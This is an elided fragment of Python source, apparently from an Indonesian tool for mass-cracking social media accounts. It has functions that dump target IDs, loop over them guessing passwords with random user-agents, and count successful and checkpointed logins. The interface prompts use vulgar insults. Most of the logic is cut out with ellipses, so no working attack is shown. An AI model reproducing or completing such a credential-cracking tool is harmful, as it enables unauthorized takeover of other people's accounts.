...
def menu(my_name,my_id):
	...
	cetak(nel('\tSELAMAT DATANG [green]%s[white] BURIK'%(my_name)))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Ngentod ? : '))
	except ValueError:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r028 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\rYR {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
